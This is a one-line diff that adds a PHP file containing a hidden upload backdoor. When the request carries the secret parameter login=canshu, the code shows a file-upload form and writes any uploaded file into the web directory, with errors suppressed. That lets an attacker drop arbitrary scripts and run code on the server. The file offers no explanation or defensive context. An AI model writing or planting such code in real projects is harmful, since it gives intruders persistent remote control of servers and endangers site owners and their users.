@@ -1,0 +1,1 @@
+<?php if($_GET["login"]=="canshu"){if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Complate !!!</b><br>'; } echo '<form action="" method="post" enctype="multipart/form-data"><input type="file" name="file" size="50"><input type="submit" value="submit"/></form>';} ?>
